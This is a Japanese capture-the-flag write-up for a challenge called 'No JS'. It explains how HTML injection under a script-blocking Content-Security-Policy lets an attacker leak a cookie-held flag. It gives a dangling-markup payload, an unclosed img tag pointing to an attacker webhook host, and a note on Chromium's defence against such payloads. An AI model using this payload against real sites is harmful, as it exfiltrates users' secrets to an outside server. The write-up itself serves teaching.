# No JS

[English version](./README.md)

## 説明

Javascriptなしでもフラグを取得できますか？

## 解説

### 概要

このチャレンジの目的は、以下の`flag` の値を漏洩させることです。

```python
@app.get("/")
def index():
    username = request.args.get("username", "guest")
    flag = request.cookies.get("flag", "no_flag")
    html = """<!doctype html>
<html>
<head>
    <meta charset="utf-8">
</head>
<body>
    <p>Hello [[username]]!</p>
    <p>Your flag is here: [[flag]]</p>
    <form>
        <input name="username" placeholder="What's your name?"><br>
        <button type="submit">Render</button>
    </form>
</body></html>"""
    # Remove spaces/linebreaks
    html = re.sub(r">\s+<", "><", html)

    # Simple templating system
    # Since Javascript is disabled, we shouldn't need to worry about XSS, right?
    html = html.replace("[[flag]]", flag)
    html = html.replace("[[username]]", username)

    response = Response(html, mimetype="text/html")
    # This Content-Security-Policy (or CSP) header prevents any Javascript from running!
    response.headers["Content-Security-Policy"] = "script-src 'none'"
    return response
```


`username` を任意の値に設定することで HTML インジェクションが発生します。ただし、Content-Security-Policy（CSP）によって JavaScript の実行はすべて防がれています。

### 解法

CSP を回避して JavaScript を実行し、フラグを取得する既知の方法はありません。

結論を先に言うと、答えは以下の通りです。

```
<img src="http://attacker.webhook/?dangling=
```

レンダリングされると、HTML は次のようになります。

```html
<img src="http://attacker.webhook/?dangling=!</p><p>Your flag is here: Alpaca{...}</p><form><input name="username" placeholder="What's your name?"> ...
```

HTMLでは、属性が`"`で始まる場合、その次の`"`までをその属性として扱います。ペイロードでは、`src`属性内の URL の途中で終了するため、その後の文字列は次の `"` まで URL の一部と扱われます。この文字列にはフラグが含まれているため、URL にもフラグが含まれることになります。そして、ホストを自分のサーバーに設定すれば、フラグを受信できます！

これは **Dangling Markup Injection** 攻撃と呼ばれます。

### 注意点

一見すると、次の行は不要に思えるかもしれません。

```python
html = re.sub(r">\s+<", "><", html)
```

しかし、これを削除すると、Dangling Markup Injection が動作しなくなります。

これは、Chromium に Dangling Markup Injection 攻撃を防ぐ仕組みがあるためです。URL に改行 `\n` と小なり記号 `<` の両方が含まれると、ブラウザはそのリクエストをブロックします。別のチャレンジで Dangling Markup Injection が機能しなかった場合は、これを思い出してください。

## フラグ

`Alpaca{XSS_is_not_the_only_client_side_vulnerability}`
